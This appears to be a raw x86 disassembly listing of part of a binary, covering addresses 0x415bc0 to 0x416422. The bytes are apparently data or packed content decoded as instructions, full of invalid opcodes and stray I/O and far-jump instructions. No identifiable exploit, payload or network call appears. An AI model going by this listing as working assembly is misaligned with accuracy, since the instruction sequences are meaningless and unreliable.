  415bc0:	(bad)  [eax+0x0]
	...
  415bcf:	add    BYTE PTR [eax],al
  415bd1:	cmc    
  415bd2:	dec    edi
  415bd3:	aam    0x3
  415bd5:	arpl   WORD PTR [ebx+ecx*8+0x68],sp
  415bd9:	xchg   edx,eax
  415bda:	pop    ss
  415bdb:	add    BYTE PTR [edi],al
  415bdd:	mov    ebx,0x91e96c61
  415be2:	pop    ecx
  415be3:	gs mov dh,0x90
  415be6:	push   0x628cba6e
  415beb:	jb     0x415b75
  415bed:	lds    ebp,FWORD PTR [eax+0x0]
  415bf0:	jmp    0x88b7c5b4
  415bf5:	mov    al,0x6c
  415bf7:	xor    DWORD PTR [ebx-0x7a9396ba],edi
  415bfd:	pusha  
  415bfe:	adc    al,0x6c
  415c00:	jge    0x415c77
  415c02:	pop    di
  415c04:	pop    ebp
  415c05:	test   BYTE PTR [esi+ebp*2],dl
  415c08:	inc    ebp
  415c09:	test   al,0x63
  415c0b:	addr16 pop ebp
  415c0d:	js     0x415c43
  415c0f:	ins    BYTE PTR es:[edi],dx
  415c10:	inc    eax
  415c11:	mov    DWORD PTR [eax+0x51],ebp
  415c14:	push   eax
  415c15:	dec    ebx
  415c16:	add    eax,0x663c5141
  415c1b:	imul   ebx,DWORD PTR ds:0x3f635e3e,0xb6b6814
  415c25:	inc    esp
  415c26:	push   edi
  415c27:	jno    0x415c3a
  415c29:	dec    eax
  415c2a:	push   ebp
  415c2b:	add    BYTE PTR [edi],ch
  415c2d:	adc    DWORD PTR [eax+0x63],ebp
  415c30:	cmp    bh,BYTE PTR [eax]
  415c32:	imul   eax,DWORD PTR [eax],0x2a
	...
  415c44:	xor    DWORD PTR [eax+0x64],ebp
  415c47:	and    al,0x5
  415c49:	pop    eax
  415c4a:	imul   ecx,DWORD PTR [ecx+esi*1],0x34
  415c4e:	je     0x415c54
  415c50:	and    BYTE PTR ds:0x6905db41,al
  415c56:	inc    esi
  415c57:	(bad)  
  415c59:	add    BYTE PTR [bp+si+0x5c12],ch
  415c5e:	jo     0x415c35
  415c60:	pop    ds
  415c61:	push   0x34ff0074
  415c66:	popa   
  415c67:	jb     0x415c7a
  415c69:	imul   esi,DWORD PTR [ebp+0x0],0xfffffff9
  415c6d:	xor    eax,0x4b0e7075
  415c72:	js     0x415ce4
  415c74:	aad    0x35
  415c76:	je     0x415cc3
  415c78:	fild   QWORD PTR [esi]
  415c7a:	add    BYTE PTR [ebx-0x38],al
  415c7d:	cs jo  0x415cf4
  415c80:	(bad)  
  415c81:	push   0x6f
  415c83:	je     0x415c1d
  415c85:	popa   
  415c86:	jne    0x415cd3
  415c88:	fild   QWORD PTR [esi]
  415c8a:	add    BYTE PTR [ebx-0x78],al
  415c8d:	das    
  415c8e:	jo     0x415d04
  415c90:	call   0xaba6c8ff
  415c95:	ss popa 
  415c97:	inc    ebx
  415c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c99:	arpl   WORD PTR [ebp+eiz*2-0x6e],si
  415c9d:	sub    eax,0x3b9f5200
  415ca2:	popa   
  415ca3:	jb     0x415c43
  415ca5:	or     eax,0x536b
	...
  415cb6:	add    BYTE PTR [edi],bl
  415cb8:	push   ebp
  415cb9:	data16 add BYTE PTR [ebp+0x6a6e6139],al
  415cc0:	aaa    
  415cc1:	imul   esp,DWORD PTR [ebx+0x6f],0x36
  415cc5:	outs   dx,DWORD PTR ds:[esi]
  415cc6:	push   esp
  415cc7:	gs pop esi
  415cc9:	popa   
  415cca:	outs   dx,BYTE PTR ds:[esi]
  415ccb:	mov    edx,0x5f70693e
  415cd0:	aaa    
  415cd1:	outs   dx,DWORD PTR ds:[esi]
  415cd2:	outs   dx,DWORD PTR ds:[esi]
  415cd3:	je     0x415d3d
  415cd5:	je     0x415d3c
  415cd7:	inc    esi
  415cd8:	bound  esp,QWORD PTR [ebx+0x67]
  415cdb:	pop    edi
  415cdc:	pop    ebp
  415cdd:	dec    ebx
  415cde:	outs   dx,BYTE PTR ds:[esi]
  415cdf:	outs   dx,DWORD PTR ds:[esi]
  415ce0:	ss popa 
  415ce2:	jb     0x415c6e
  415ce4:	dec    eax
  415ce5:	popa   
  415ce6:	je     0x415c96
  415ce8:	pusha  
  415ce9:	addr16 gs arpl sp,cx
  415ced:	dec    edx
  415cee:	outs   dx,BYTE PTR ds:[esi]
  415cef:	std    
  415cf0:	xchg   edx,eax
  415cf1:	dec    edi
  415cf2:	imul   eax,edx,0xffffff90
  415cf5:	push   0x6d
  415cf7:	(bad)
  415cfa:	ins    DWORD PTR es:[edi],dx
  415cfb:	mov    ebp,0xcf726692
  415d00:	outs   dx,DWORD PTR ds:[esi]
  415d01:	push   0x64
  415d03:	xchg   edi,eax
  415d04:	jnp    0x415d36
  415d06:	je     0x415cb9
  415d08:	jne    0x415d75
  415d0a:	gs nop
  415d0c:	test   DWORD PTR [ebp+0x3f],esp
  415d0f:	arpl   WORD PTR [eax+0x6c],si
  415d12:	mov    WORD PTR gs:[edx+0x36],?
  415d16:	jno    0x415d96
  415d18:	dec    esi
  415d19:	inc    edx
	...
  415d2a:	lahf   
  415d2b:	mov    ebp,DWORD PTR [ecx+ebp*2-0x72]
  415d2f:	dec    esp
  415d30:	xor    DWORD PTR [edx-0x76],esi
  415d33:	xor    ch,BYTE PTR [ebx+0x6c]
  415d36:	jle    0x415d83
  415d38:	pop    edi
  415d39:	push   esi
  415d3a:	or     BYTE PTR [eax+0x4f],0x63
  415d3e:	mov    ds:0x496444dc,al
  415d43:	adc    DWORD PTR [ebp+0x74],edx
  415d46:	das    
  415d47:	inc    ebx
  415d48:	ins    DWORD PTR es:[edi],dx
  415d49:	arpl   WORD PTR ds:0x4d6755ec,di
  415d4f:	inc    ebp
  415d50:	push   0x55014463
  415d55:	add    BYTE PTR [ebx-0x1],ah
  415d58:	push   ebp
  415d59:	ja     0x415d8e
  415d5b:	lock adc al,0x32
  415d5e:	jne    0x415d68
  415d60:	push   0x5f1f636c
  415d65:	jb     0x415d76
  415d67:	and    edx,DWORD PTR [ebx+eiz*2-0x3]
  415d6b:	out    dx,al
  415d6c:	pop    edx
  415d6d:	jno    0x415d7e
  415d6f:	or     DWORD PTR [edi+0x51],esp
  415d72:	test   DWORD PTR [esi+edx*8],0xe7440055
  415d79:	inc    esi
  415d7a:	add    BYTE PTR [edi-0x25],dl
  415d7d:	inc    eax
  415d7e:	cmc    
  415d7f:	push   edi
  415d80:	mov    esp,0xbb57c046
  415d85:	ins    BYTE PTR es:[edi],dx
  415d86:	mov    ebp,0xd764ca5c
  415d8b:	push   0x4cba
	...
  415d9c:	add    BYTE PTR [ebp-0x4e954cca],dh
  415da2:	push   0x57c046e7
  415da7:	xchg   ebx,eax
  415da8:	inc    esi
  415da9:	mov    edi,0x92609a62
  415dae:	pop    ecx
  415daf:	jle    0x415e06
  415db1:	add    BYTE PTR ds:0x558c55aa,0x73
  415db8:	inc    esp
  415db9:	adc    BYTE PTR [esp+edi*2+0x6c],0x91
  415dbe:	push   0x597160aa
  415dc3:	push   eax
  415dc4:	bound  edi,QWORD PTR [esi+eiz*2+0x48]
  415dc8:	push   eax
  415dc9:	xor    BYTE PTR ds:0x646d6d59,0x53
  415dd0:	popa   
  415dd1:	sub    ch,BYTE PTR [eax+0x40]
  415dd4:	add    al,0x63
  415dd6:	add    eax,0x56303e7
  415ddb:	out    0x3,eax
  415ddd:	arpl   WORD PTR ds:0x56303e7,ax
  415de3:	out    0x3,eax
  415de5:	arpl   WORD PTR ds:0x56303e7,ax
  415deb:	out    0x3,eax
  415ded:	arpl   WORD PTR ds:0x56303e7,ax
  415df3:	out    0x3,eax
  415df5:	arpl   WORD PTR ds:0x56303e7,ax
  415dfb:	add    cl,ch
  415dfd:	pusha  
  415dfe:	add    eax,0xe900
	...
  415e0f:	add    BYTE PTR [eax+0x5],ah
  415e12:	add    cl,ch
  415e14:	pusha  
  415e15:	add    eax,0x560e900
  415e1a:	add    cl,ch
  415e1c:	pusha  
  415e1d:	add    eax,0x560e900
  415e22:	add    cl,ch
  415e24:	pusha  
  415e25:	add    eax,0x560e900
  415e2a:	add    cl,ch
  415e2c:	pusha  
  415e2d:	add    eax,0x560e900
  415e32:	add    cl,ch
  415e34:	pusha  
  415e35:	add    eax,0x560e900
  415e3a:	add    cl,ch
  415e3c:	pusha  
  415e3d:	add    eax,0x560e900
  415e42:	add    cl,ch
  415e44:	pusha  
  415e45:	add    eax,0x499f9648
  415e4a:	add    BYTE PTR [edx+0x43],dh
  415e4d:	adc    eax,0x244b9138
  415e52:	xor    BYTE PTR ds:0x19231c37,bl
  415e58:	push   ebx
  415e59:	sub    eax,0x134f0c2b
  415e5e:	pop    eax
  415e5f:	add    al,0x77
  415e61:	adc    ebx,DWORD PTR [eax+0x14]
  415e64:	je     0x415e7b
  415e66:	xor    ah,BYTE PTR [ecx]
  415e68:	ins    BYTE PTR es:[edi],dx
  415e69:	adc    eax,0x15641132
  415e6e:	xor    dl,BYTE PTR [ecx]
  415e70:	pop    esp
  415e71:	adc    eax,0x4132
	...
  415e82:	add    BYTE PTR [ebp+edx*1+0x32],dl
  415e86:	inc    ecx
  415e87:	dec    esp
  415e88:	adc    eax,0x50c3132
  415e8d:	inc    ebp
  415e8e:	add    al,0x33
  415e90:	aas    
  415e91:	pop    edi
  415e92:	add    BYTE PTR [esi+0x6965765b],dl
  415e98:	sub    al,0x6f
  415e9a:	je     0x415ef3
  415e9c:	push   0x5e646e45
  415ea1:	add    BYTE PTR [ebx-0x59],ch
  415ea4:	cmp    ch,BYTE PTR [esi+0x65]
  415ea7:	sahf   
  415ea8:	stc    
  415ea9:	xor    DWORD PTR [esi],ebp
  415eab:	xchg   esi,eax
  415eac:	push   0x3903006c
  415eb1:	push   ebx
  415eb2:	outs   dx,DWORD PTR ds:[esi]
  415eb3:	adc    eax,0x85033f6
  415eb8:	pop    ebp
  415eb9:	pop    edi
  415eba:	or     DWORD PTR gs:[ecx],edi
  415ebd:	add    BYTE PTR [ebx-0x3],dl
  415ec0:	gs je  0x415f3a
  415ec3:	jmp    0x415efe
  415ec5:	popa   
  415ec6:	pop    esp
  415ec7:	add    al,0x63
  415ec9:	jb     0x415f27
  415ecb:	jmp    0x6f5d:0xe3677167
  415ed2:	pop    esp
  415ed3:	les    ebx,FWORD PTR [edi]
  415ed5:	push   eax
  415ed6:	pop    esp
  415ed7:	rcr    BYTE PTR [edi+ebp*2+0x74],cl
  415edb:	mov    DWORD PTR [edi+ecx*2],eax
  415ede:	outs   dx,DWORD PTR ds:[esi]
  415edf:	in     al,0x3f
  415ee1:	jae    0x415f44
  415ee3:	cwde   
  415ee4:	xor    BYTE PTR [esi+eax*2+0x0],bl
	...
  415ef4:	add    BYTE PTR [eax],al
  415ef6:	fwait
  415ef7:	aaa    
  415ef8:	xor    bl,BYTE PTR [edx+ebp*1+0x5d]
  415efc:	jno    0x415f65
  415efe:	and    ebx,DWORD PTR [ebx+0x6f]
  415f01:	pop    esp
  415f02:	test   BYTE PTR ds:0x5e925c50,dl
  415f08:	outs   dx,DWORD PTR ds:[esi]
  415f09:	je     0x415e94
  415f0b:	or     DWORD PTR [edi+0x6f],ecx
  415f0e:	and    al,0x35
  415f10:	jae    0x415f73
  415f12:	pop    eax
  415f13:	xor    BYTE PTR [esi+eax*2+0x5b],bl
  415f17:	aaa    
  415f18:	pop    esp
  415f19:	push   ebx
  415f1a:	arpl   bp,di
  415f1c:	push   ecx
  415f1d:	arpl   WORD PTR [edi],ax
  415f1f:	sub    ch,BYTE PTR [ecx+0x5f]
  415f22:	pop    es
  415f23:	neg    DWORD PTR [esi+0x48]
  415f26:	cli    
  415f27:	retf   0x6d4d
  415f2a:	adc    ebp,edx
  415f2c:	xor    eax,0x4bee1746
  415f31:	ins    DWORD PTR es:[edi],dx
  415f32:	lock mov cl,0x1
  415f35:	push   ecx
  415f36:	cld    
  415f37:	(bad)  
  415f38:	dec    ebp
  415f39:	jne    0x415f3d
  415f3b:	lods   al,BYTE PTR ds:[esi]
  415f3c:	pop    esi
  415f3d:	pop    esp
  415f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f3f:	mov    ebp,0x6bb73253
  415f44:	bound  esi,QWORD PTR [esi-0x3a]
  415f47:	enter  0x673d,0xc2
  415f4b:	enter  0x6568,0xab
  415f4f:	lds    edx,FWORD PTR [esp+esi*2-0x3c]
  415f53:	push   0x5a
  415f55:	pop    esp
  415f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f57:	cwde   
  415f58:	xor    DWORD PTR [eax+0x0],ecx
	...
  415f67:	add    BYTE PTR [eax],al
  415f69:	mov    ah,0x6b
  415f6b:	dec    ebp
  415f6c:	add    BYTE PTR [ebx-0x738eab83],dh
  415f72:	ja     0x415fc7
  415f74:	arpl   WORD PTR fs:[eax+ebp*2+0x62a68f71],dx
  415f7c:	imul   eax,DWORD PTR [esi+0x7e712edc],0x2a
  415f83:	add    al,0x4c
  415f85:	jp     0x415fc5
  415f87:	pop    edi
  415f88:	add    BYTE PTR [ebx+edi*1+0x5c],ch
  415f8c:	pop    ebp
  415f8d:	inc    ebp
  415f8e:	cmp    BYTE PTR [esi+ebp*1+0x4a],dl
  415f92:	imul   eax,DWORD PTR ss:[eax],0x2f
  415f96:	daa    
  415f97:	dec    esp
  415f98:	inc    edi
  415f99:	xor    BYTE PTR [eax],ch
  415f9b:	aas    
  415f9c:	push   edx
  415f9d:	arpl   WORD PTR ds:0x52f7166,sp
  415fa3:	or     BYTE PTR [eax+0x3f],ch
  415fa6:	dec    ecx
  415fa7:	adc    BYTE PTR [edx+0x63],dl
  415faa:	inc    edi
  415fab:	sbb    edx,DWORD PTR [esp+0x5f]
  415faf:	add    BYTE PTR [esi+0x34],al
  415fb2:	pusha  
  415fb3:	or     al,0x4
  415fb5:	xor    bl,BYTE PTR [esi+0x5]
  415fb8:	push   eax
  415fb9:	push   cs
  415fba:	fs stc 
  415fbc:	pusha  
  415fbd:	pop    ds
  415fbe:	inc    esi
  415fbf:	jmp    FWORD PTR [edx+esi*8+0x60]
  415fc3:	int3   
  415fc4:	push   ecx
  415fc5:	(bad)  
  415fc7:	shl    BYTE PTR [ebp-0x1],1
  415fca:	pop    ebp
  415fcb:	ficom  WORD PTR [edx+0x0]
	...
  415fda:	add    BYTE PTR [eax],al
  415fdc:	add    DWORD PTR [edx-0x42],0x68
  415fe0:	enter  0xd564,0x5f
  415fe4:	rcl    BYTE PTR [ebx-0x19],0x32
  415fe8:	mov    dh,0x67
  415fea:	mov    ebx,0xc4539c4e
  415fef:	aaa    
  415ff0:	sahf   
  415ff1:	pop    ebp
  415ff2:	nop
  415ff3:	push   edx
  415ff4:	mov    edi,0x8f379968
  415ff9:	pop    esi
  415ffa:	fwait
  415ffb:	fs (bad) 
  415ffd:	and    eax,0x608866aa
  416002:	mov    BYTE PTR [ebp-0x79],ah
  416005:	push   0x3ca70379
  41600a:	ja     0x41605e
  41600c:	jbe    0x41606a
  41600e:	jae    0x416072
  416010:	mov    eax,DWORD PTR ds:0x68776d3a
  416016:	pop    edx
  416017:	cmp    BYTE PTR [ebx+0x31],ah
  41601a:	and    BYTE PTR [edx+edx*2+0x56],dl
  41601e:	inc    eax
  41601f:	push   eax
  416020:	inc    edx
  416021:	pop    ebp
  416022:	and    ebp,DWORD PTR [edi]
  416024:	xor    ch,BYTE PTR [esi]
  416026:	and    eax,0x53330
  41602b:	adc    eax,0xff6e662c
  416030:	inc    edi
  416031:	pop    edi
  416032:	addr16 jmp 0x10afc6be
  416038:	pop    edi
  416039:	cmp    BYTE PTR [ecx+0x36],dl
  41603c:	pop    ebp
  41603d:	cmp    DWORD PTR [eax-0x17],edx
	...
  41604c:	add    BYTE PTR [eax],al
  41604e:	add    BYTE PTR [esi+eax*2+0x52],dl
  416052:	jmp    0x2587a2a3
  416057:	push   ss
  416058:	xor    eax,DWORD PTR [eax]
  41605a:	sub    dh,BYTE PTR [edx]
  41605c:	cmp    DWORD PTR [ebx+0x27],eax
  41605f:	xor    esi,DWORD PTR ds:0x3d21b800
  416065:	ficom  DWORD PTR [si]
  416068:	pusha  
  416069:	jb     0x41603b
  41606b:	pusha  
  41606c:	ss ins DWORD PTR es:[edi],dx
  41606e:	(bad)  
  41606f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416070:	push   edx
  416071:	pop    edi
  416072:	mov    ebx,0xcd4529c3
  416077:	mov    ebp,0x71c55f67
  41607c:	inc    esi
  41607d:	aas    
  41607e:	cdq    
  41607f:	mov    ds:0x9c9c4129,eax
  416084:	push   0x2570b546
  416089:	ss leave 
  41608b:	test   al,0x5a
  41608d:	imul   eax,DWORD PTR [esp+ecx*2-0x7a62bec4],0x5a
  416095:	ins    BYTE PTR es:[edi],dx
  416096:	mov    edi,DWORD PTR [edi+0x57]
  416099:	add    BYTE PTR [edx+0x76746385],bl
  41609f:	jg     0x4160f8
  4160a1:	arpl   WORD PTR [ebp+0x2e],ax
  4160a4:	pop    ecx
  4160a5:	ins    DWORD PTR es:[edi],dx
  4160a6:	dec    ebx
  4160a7:	sbb    BYTE PTR [ecx+0x51],0x2a
  4160ab:	and    BYTE PTR ds:0x58222d43,dh
  4160b1:	je     0x4160b3
	...
  4160bf:	add    BYTE PTR [eax],al
  4160c1:	add    BYTE PTR [edi],bl
  4160c3:	or     edx,DWORD PTR [eax+edx*2+0x5a]
  4160c7:	sti    
  4160c8:	pop    ds
  4160c9:	push   eax
  4160ca:	js     0x41612e
  4160cc:	data16 gs jns 0x416106
  4160d0:	outs   dx,DWORD PTR gs:[esi]
  4160d2:	push   esp
  4160d3:	push   0x466b5c6c
  4160d8:	push   esp
  4160d9:	outs   dx,DWORD PTR ds:[esi]
  4160da:	gs pop ebp
  4160dc:	bound  esp,QWORD PTR [ecx+0x78]
  4160df:	add    DWORD PTR [edi+0x6f],ecx
  4160e2:	pop    esp
  4160e3:	xor    eax,0x2b886173
  4160e8:	pop    esp
  4160e9:	inc    edi
  4160ea:	bound  sp,DWORD PTR [edx+0x61]
  4160ee:	jbe    0x416105
  4160f0:	aas    
  4160f1:	inc    ecx
  4160f2:	stos   BYTE PTR es:[edi],al
  4160f3:	or     ebx,DWORD PTR [ebx+eax*2-0x71]
  4160f7:	cmp    al,0x61
  4160f9:	inc    esi
  4160fa:	push   ds
  4160fb:	sbb    BYTE PTR [eax],ah
  4160fd:	aaa    
  4160fe:	push   0x39
  416100:	imul   ebp,DWORD PTR [ebp+0x1f],0x14
  416104:	dec    ebp
  416105:	inc    ebx
  416106:	out    dx,al
  416107:	pusha  
  416108:	imul   ebp,DWORD PTR [eax+ebp*1+0x67],0x72
  41610d:	add    cl,bl
  41610f:	pusha  
  416110:	data16 je 0x4160e0
  416113:	data16 jb 0x41617b
  416116:	out    0x8,al
  416118:	ins    BYTE PTR es:[edi],dx
  416119:	outs   dx,DWORD PTR ds:[esi]
  41611a:	call   0xc994cd85
  41611f:	inc    esi
  416120:	push   eax
  416121:	inc    ebp
  416122:	mov    BYTE PTR [ecx+esi*2+0x74],0x0
	...
  416133:	add    BYTE PTR [eax],al
  416135:	fisttp WORD PTR [ecx]
  416137:	push   esp
  416138:	push   eax
  416139:	sub    bh,cl
  41613b:	pop    ds
  41613c:	push   eax
  41613d:	js     0x4161a0
  41613f:	mov    WORD PTR gs:[esi],si
  416143:	outs   dx,DWORD PTR gs:[esi]
  416145:	xchg   esp,eax
  416146:	push   0xd635c6c
  41614b:	aas    
  41614c:	push   esp
  41614d:	inc    esp
  41614e:	or     ebp,DWORD PTR [eax+0x62]
  416151:	inc    edx
  416152:	adc    BYTE PTR [ecx+edx*2],al
  416155:	xor    al,0x44
  416157:	push   eax
  416158:	jne    0x41619c
  41615a:	adc    BYTE PTR [ebp+0x5c],bl
  41615d:	sbb    al,0xa
  41615f:	arpl   WORD PTR [edx+0x42],sp
  416162:	repnz cs inc ecx
  416165:	and    cl,BYTE PTR [esi]
  416167:	cmp    eax,0x4fe9205c
  41616c:	arpl   WORD PTR ds:0x4b203412,bx
  416172:	mov    esi,0xf66d49
  416177:	cmp    BYTE PTR [edi+0x20],cl
  41617a:	jmp    0x7261:0x76d62
  416181:	arpl   WORD PTR [edi-0x4d10999c],cx
  416187:	bound  esi,QWORD PTR [edx-0x3a]
  41618a:	nop
  41618b:	cmp    al,0x6c
  41618d:	les    edi,FWORD PTR [esi-0x604f939e]
  416193:	inc    edx
  416194:	push   eax
  416195:	sahf   
  416196:	push   0x7340
	...
  4161a7:	add    BYTE PTR [edi-0x6cabc447],dh
  4161ad:	cld    
  4161ae:	sbb    esp,DWORD PTR [eax]
  4161b0:	xchg   ebx,eax
  4161b1:	outs   dx,BYTE PTR ds:[esi]
  4161b2:	fs mov si,0x506f
  4161b7:	mov    WORD PTR [bp+si+0x6c62],es
  4161bc:	mov    bh,0x8d
  4161be:	inc    eax
  4161bf:	push   esp
  4161c0:	jl     0x416235
  4161c2:	bound  eax,QWORD PTR gs:[edx-0x5ba3feb2]
  4161c9:	and    BYTE PTR [edx+eiz*2-0x7e],0x48
  4161ce:	xor    BYTE PTR [ecx-0x5e],al
  4161d1:	add    eax,0x46874937
  4161d6:	push   esp
  4161d7:	pop    eax
  4161d8:	inc    eax
  4161d9:	inc    ebx
  4161da:	cmp    esi,DWORD PTR [ebx+eiz*2]
  4161dd:	sub    DWORD PTR [esi],esp
  4161df:	pusha  
  4161e0:	ds addr16 dec eax
  4161e3:	pusha  
  4161e4:	xor    al,BYTE PTR [esi+0x28]
  4161e7:	xor    al,0x20
  4161e9:	sub    DWORD PTR [edx],ebp
  4161eb:	pop    ecx
  4161ec:	das    
  4161ed:	pusha  
  4161ee:	and    eax,0x37251338
  4161f3:	push   esi
  4161f4:	ss add eax,0x5a0f4b3b
  4161fa:	or     DWORD PTR [ebp+0x7],esp
  4161fd:	sub    al,BYTE PTR ss:[ebp+0x33]
  416201:	inc    eax
  416202:	and    eax,DWORD PTR [edi+0x10]
  416205:	push   ecx
  416206:	add    al,0x4a
  416208:	pop    ss
  416209:	xor    eax,0x3fc7
	...
  41621a:	add    ah,bh
  41621c:	push   eax
  41621d:	add    al,0x4
  41621f:	cmovbe ebx,esp
  416222:	push   edi
  416223:	add    BYTE PTR [ebx-0x4d],al
  416226:	xor    esp,DWORD PTR [ebx+0x29]
  416229:	fisub  DWORD PTR [eax-0x7b]
  41622c:	popa   
  41622d:	enter  0x6357,0x36
  416231:	(bad)  
  416232:	imul   ecx,edi,0xc055c852
  416238:	sub    DWORD PTR [ebp-0x40a96ba1],ebp
  41623e:	dec    ecx
  41623f:	mov    esi,DWORD PTR ds:0x366316c3
  416245:	mov    gs,WORD PTR [ecx-0x69]
  416248:	push   edx
  416249:	mov    BYTE PTR [ebp-0x80],dl
  41624c:	sub    DWORD PTR [ebp-0x70a953a1],esp
  416252:	dec    ecx
  416253:	stos   DWORD PTR es:[edi],eax
  416254:	xor    eax,0x638e36e7
  416259:	add    BYTE PTR [ebp-0x67],bh
  41625c:	sub    dh,BYTE PTR [edx-0x7c]
  41625f:	cmp    al,0x43
  416261:	ins    BYTE PTR es:[edi],dx
  416262:	dec    eax
  416263:	mov    WORD PTR [ebp+0x46],ds
  416266:	inc    ecx
  416267:	xchg   edi,eax
  416268:	sub    DWORD PTR [ecx+ebp*8],esi
  41626b:	xchg   edi,eax
  41626c:	pop    ebx
  41626d:	jno    0x4162c4
  41626f:	inc    esi
  416270:	pop    ecx
  416271:	ins    BYTE PTR es:[edi],dx
  416272:	dec    esp
  416273:	sub    eax,0x1f355f41
  416278:	xor    eax,0x5173d5f
  41627d:	jo     0x4162c7
	...
  41628b:	add    BYTE PTR [eax],al
  41628d:	add    BYTE PTR [ebx],cl
  41628f:	pop    ebp
  416290:	add    BYTE PTR [eax],dh
  416292:	inc    ecx
  416293:	push   esp
  416294:	je     0x41629e
  416296:	add    ebx,DWORD PTR [ecx+0x20]
  416299:	cmp    esi,edi
  41629b:	push   eax
  41629c:	push   0x742a24e9
  4162a1:	or     BYTE PTR [ecx],bl
  4162a3:	pop    eax
  4162a4:	ins    BYTE PTR es:[edi],dx
  4162a5:	add    eax,0x1500570a
  4162aa:	sub    al,0x62
  4162ac:	je     0x4162b2
  4162ae:	adc    al,0x1b
  4162b0:	fs enter 0x50c,0x5c
  4162b5:	mov    eax,0xc26160bb
  4162ba:	and    BYTE PTR [ecx+0x5f],0xd5
  4162be:	pusha  
  4162bf:	sub    DWORD PTR [eax-0x30],ecx
  4162c2:	lods   eax,DWORD PTR ds:[esi]
  4162c3:	push   ecx
  4162c4:	ins    DWORD PTR es:[edi],dx
  4162c5:	mov    ebx,0xc86417af
  4162ca:	mov    WORD PTR ds:0x288ca75c,es
  4162d0:	jno    0x416263
  4162d2:	call   0x5c05:0x75bd502d
  4162d9:	scas   eax,DWORD PTR es:[edi]
  4162da:	mov    ah,0x28
  4162dc:	jno    0x41625f
  4162de:	call   0xfff0:0xbe00502d
  4162e5:	pop    ebx
  4162e6:	les    ebp,FWORD PTR [ecx]
  4162e8:	ins    BYTE PTR es:[edi],dx
  4162e9:	shr    BYTE PTR gs:[ecx],1
  4162ec:	ins    BYTE PTR es:[edi],dx
  4162ed:	ins    BYTE PTR es:[edi],dx
  4162ee:	fild   DWORD PTR [esp+ebx*2]
  4162f1:	jae    0x4162f3
	...
  4162ff:	add    BYTE PTR [eax],al
  416301:	xchg   ebx,eax
  416302:	sub    eax,0x632b6d61
  416307:	pop    ebp
  416308:	addr16 daa 
  41630a:	das    
  41630b:	cs js  0x41629d
  41630e:	add    BYTE PTR gs:[eax+ecx*4+0x60],bl
  416313:	pop    edi
  416314:	gs sub al,0x2d
  416317:	outs   dx,DWORD PTR ds:[esi]
  416318:	gs js  0x416346
  41631b:	popa   
  41631c:	jb     0x416387
  41631e:	and    edi,DWORD PTR [eax+0x6d]
  416321:	dec    esi
  416322:	add    DWORD PTR [esi+eiz*2+0x73],ebx
  416326:	gs popa 
  416328:	jp     0x41638d
  41632a:	gs ins BYTE PTR es:[edi],dx
  41632c:	popa   
  41632d:	int3   
  41632e:	cmp    al,0x69
  416330:	ins    BYTE PTR es:[edi],dx
  416331:	jp     0x416344
  416333:	imul   esp,DWORD PTR [esi+0x76],0x2d
  416337:	pop    ebp
  416338:	jb     0x4163a1
  41633a:	adc    eax,0x5f6e6946
  41633f:	pop    edx
  416340:	imul   ecx,DWORD PTR [esi+0x19005d28],0x35746665
  41634a:	arpl   WORD PTR [edx+0x65],si
  41634d:	(bad)  
  41634e:	cmp    eax,0x1a176c65
  416353:	gs ins BYTE PTR es:[edi],dx
  416355:	arpl   WORD PTR cs:[eax],sp
  416358:	inc    ebx
  416359:	push   ds
  41635a:	sub    esp,DWORD PTR [ecx+0x6e]
  41635d:	test   BYTE PTR [ebx],0x45
  416360:	outs   dx,BYTE PTR ds:[esi]
  416361:	leave  
  416362:	das    
  416363:	pop    ebp
  416364:	ins    BYTE PTR es:[edi],dx
	...
  416371:	add    BYTE PTR [eax],al
  416373:	add    dh,ch
  416375:	adc    al,0x44
  416377:	imul   esp,DWORD PTR [ebx+0x6c],0x6b7c4801
  41637e:	push   ebp
  41637f:	add    BYTE PTR [esi+0x6372664b],ch
  416385:	outs   dx,BYTE PTR ds:[esi]
  416386:	bound  esi,QWORD PTR [ecx+0x70]
  416389:	fidiv  WORD PTR [ecx]
  41638b:	ins    DWORD PTR es:[edi],dx
  41638c:	jno    0x4163e0
  41638e:	add    DWORD PTR [edx+0x7e],edx
  416391:	xor    DWORD PTR [edi+0x74],ebx
  416394:	inc    esi
  416395:	inc    BYTE PTR [edi+0x67]
  416398:	push   ecx
  416399:	fidiv  WORD PTR [ebx+eiz*2]
  41639c:	push   ecx
  41639d:	xor    BYTE PTR [ebp+0x72],ah
  4163a0:	sub    edx,0x48
  4163a3:	jo     0x4163eb
  4163a5:	fidiv  WORD PTR [ebx+eiz*2]
  4163a8:	xor    DWORD PTR [eax],ecx
  4163aa:	gs jb  0x41642a
  4163ad:	es pop edi
  4163af:	jno    0x4163e0
  4163b1:	fidiv  WORD PTR [ebx+eiz*2]
  4163b4:	adc    eax,esi
  4163b6:	fs jb  0x4163fe
  4163b9:	or     DWORD PTR [ebx+0x63],edx
  4163bc:	adc    esi,ebx
  4163be:	xor    al,0x63
  4163c0:	adc    eax,ecx
  4163c2:	data16 jb 0x416412
  4163c5:	out    dx,al
  4163c6:	pusha  
  4163c7:	jno    0x4163b9
  4163c9:	fnsave [ebx+eiz*2]
  4163cc:	icebp  
  4163cd:	iret   
  4163ce:	data16 jb 0x416406
  4163d1:	mov    fs,WORD PTR [eax+0x72]
  4163d4:	xlat   BYTE PTR ds:[ebx]
  4163d5:	fdiv   QWORD PTR [ecx]
  4163d7:	pop    edi
	...
  4163e4:	add    BYTE PTR [eax],al
  4163e6:	add    bh,cl
  4163e8:	les    eax,FWORD PTR [ecx]
  4163ea:	push   ecx
  4163eb:	(bad)  
  4163ec:	stos   BYTE PTR es:[edi],al
  4163ed:	push   edi
  4163ee:	arpl   cx,dx
  4163f0:	push   0xdcc6704a
  4163f5:	cmp    eax,0x2188b05f
  4163fa:	push   ecx
  4163fb:	(bad)  
  4163fc:	mov    dl,BYTE PTR [edi+0x63]
  4163ff:	mov    cl,0x5
  416401:	(bad)  
  416402:	cmp    ecx,DWORD PTR [esi-0x58fc6cae]
  416408:	fs call 0x8d55:0x84324357
  416410:	pusha  
  416411:	jns    0x416436
  416413:	nop
  416414:	push   edx
  416415:	test   BYTE PTR [ebp+0x63],dl
  416418:	cmp    DWORD PTR [eax-0x65da88ac],ecx
  41641e:	data16 jno 0x416470
  416421:	dec    esp
  416422:	push   edx
